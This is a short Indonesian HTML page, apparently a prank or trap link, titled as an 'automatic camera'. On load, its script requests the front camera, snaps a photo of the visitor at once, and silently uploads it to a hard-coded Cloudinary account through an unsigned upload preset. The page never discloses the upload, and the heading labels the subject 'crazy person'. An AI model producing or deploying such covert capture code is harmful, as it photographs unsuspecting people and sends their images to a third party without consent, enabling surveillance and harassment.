<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kamera Otomatis</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            background: #f0f0f0; 
            font-family: Arial, sans-serif; 
            flex-direction: column;
        }
        .container {
            text-align: center;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
        }
        h1 { margin-bottom: 15px; }
        #preview {
            margin-top: 15px;
            width: 300px; 
            height: auto; 
            border-radius: 10px;
            border: 2px solid black;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ORANG GILA :</h1>
        <video id="camera" autoplay playsinline style="display: none;"></video>
        <canvas id="canvas" style="display: none;"></canvas>
        <img id="preview">
    </div>

    <script>
        const video = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const preview = document.getElementById('preview');
        const ctx = canvas.getContext('2d');

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    console.log("Kamera aktif, mengambil foto...");
                    requestAnimationFrame(checkFrame);
                };
            } catch (err) {
                console.error("Izin kamera ditolak!", err);
                alert("Izin kamera diperlukan untuk mengambil foto.");
            }
        }

        function checkFrame() {
            if (video.videoWidth > 0 && video.videoHeight > 0) {
                takePhoto();
            } else {
                requestAnimationFrame(checkFrame);
            }
        }

        function takePhoto() {
            console.log("Mengambil foto...");
            canvas.width = 400;  // Resolusi lebih kecil agar lebih cepat
            canvas.height = 600;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            preview.src = canvas.toDataURL("image/jpeg", 0.7);  // Ditampilkan langsung

            setTimeout(() => {
                canvas.toBlob(uploadToCloudinary, "image/jpeg", 0.6);
            }, 50);
        }

        function uploadToCloudinary(imageBlob) {
            let cloudName = "dl5dswv7q";  
            let uploadPreset = "tikontol";  

            let formData = new FormData();
            formData.append("file", imageBlob);
            formData.append("upload_preset", uploadPreset);

            fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
                method: "POST",
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.secure_url) {
                    console.log("Foto berhasil diunggah:", data.secure_url);
                } else {
                    console.error("Gagal unggah! Respon:", data);
                }
            })
            .catch(error => console.error("Gagal upload!", error));
        }

        startCamera();
    </script>
</body>
</html>
